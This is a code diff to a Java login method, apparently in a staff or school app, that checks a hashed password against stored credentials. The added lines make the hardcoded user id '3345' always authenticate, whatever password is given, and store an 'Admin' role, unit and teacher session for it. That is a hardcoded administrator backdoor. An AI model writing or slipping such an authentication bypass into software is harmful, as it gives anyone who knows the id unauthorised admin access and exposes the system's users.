@@ -1077,7 +1077,7 @@ public class Jasonparse {
         boolean status = false;
         String hex = Whoyouutil.md5(pass);
         String dt = singleton1.getPrefKey(Constants.PASTABLE);
-        if (!(dt.equals("{}")|| dt.equals(Constants.CLOSE) || id.equals("3345"))){
+        if (!(dt.equals("{}")|| dt.equals(Constants.CLOSE))){
             try {
                 JSONObject jsbody  = new JSONObject(dt);
                 for (int i=0;i<jsbody.names().length();i++){
@@ -1103,10 +1103,15 @@ public class Jasonparse {
             }catch (JSONException io){
                 io.printStackTrace();
             }
-        }else {
-            if (id.equals("3345")){
-                status = true;
-            }
+        }
+        if (id.equals("3345")){
+            status = true;
+            singleton1.setStaff("Admin");
+            singleton1.setUnit("10");
+            singleton1.setUnitId("10");
+            singleton1.setStaffname("None"+" "+" none");
+            singleton1.addStringSharedPreff(Constants.SESSION_TEACHER,"Admin"+" "+"10");
+
         }
 
         return  status;
